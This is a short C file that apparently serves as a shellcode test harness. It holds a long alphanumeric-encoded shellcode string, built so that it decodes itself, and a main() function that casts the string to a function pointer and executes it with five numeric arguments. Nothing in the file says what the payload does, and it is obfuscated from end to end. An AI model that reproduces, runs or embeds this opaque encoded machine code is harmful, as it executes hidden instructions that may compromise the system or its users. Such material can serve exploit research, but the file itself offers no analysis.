
char shellcode[] = "%EEEE%::::PPPPPPPPPH+D$ XXXtNXXXXXXVSPPPPj PPPPPPPP4T)D$04P)D$,4'4 )D$($ PZ3D$@+D$ YQ3H +L$ XP3Q +T$0XPf55ntvf)B|+T$0+T$0+T$0R[YQ^VXP2CP<0tF1D$$kD$$@!L$$2CQ1D$$kD$$@!L$$2CR1D$$kD$$@!L$$2CS+\\$,3BP1BP1rP3rP+T$(  XXXXXXXXXXXXX[^tJAYAZQ4tPPPPH)D$@4pH)D$84'4 H)D$0$ PH+L$ H3AtH+D$ L3PtL+T$HXPf55{L+T$HL+T$HtqfA)B8ARA[YQXPA2CD<0tR1D$0kD$0@L!L$0A2CE1D$0kD$0@L!L$0A2CF1D$0kD$0@L!L$0A2CGL+\\$@A3BDA1BDA1JDA3JDL+T$8  XXXXXYXXXXqBLHOJA@n[??n[=ezoieZZprkhs^ljbZljbZ=bNZ_Q_>HirF[Q^Z[IrzRM wGDDoeTtKTfdGVduCVduCGhiCGhygGhygCmzXGcH[D_J^DV VfF VX<TI@<_veu]flqomliCuelQxpdudatE@hrwIkzSMzvOizw_Mzw_MssLJssLZBCLZ@A]^@A]^TNa^oFmn^nIv@aSsbT?WeWnSg_DCgKjKWCgHe[wJGe;?@fj;Ifyr@cfMAmTN_rNKNzxilIhMnADMgDV@cm;<jihu?aE=]rdY\\puMUpgDuAa;UqSWBSPSUG=LUFNNESSOPGVYEbGXQWROj__GHKjOj_MIHKj^x?IRh=XVh=XVKH<VYKlJWLbAEtOIg@nIDT^HJVOD[KGudwGDEeFT[reTWJ@\\ht>a;r>cruLna<Mniy?eKL_]zy?\\pznXpznXANNXIL_\\IL_\\xSc\\iMIUzQIdEoomgyo=XAyzJCDBXN>=QKmvHmtvO]HXO]J\\O]J\\m]hV?]mXmQvgl=tdpaS RUqPBV \\PRocNMQflywB>;gFluaO?jKF@UIO ai_vUJ[apwFqeFGfACZVu>[0";

int main(int argc, char **argv){
        void (*fp) (long, long, long, long, long);
        fp = (void *)shellcode;
        fp(15, 31, 63, 127, 255);
}
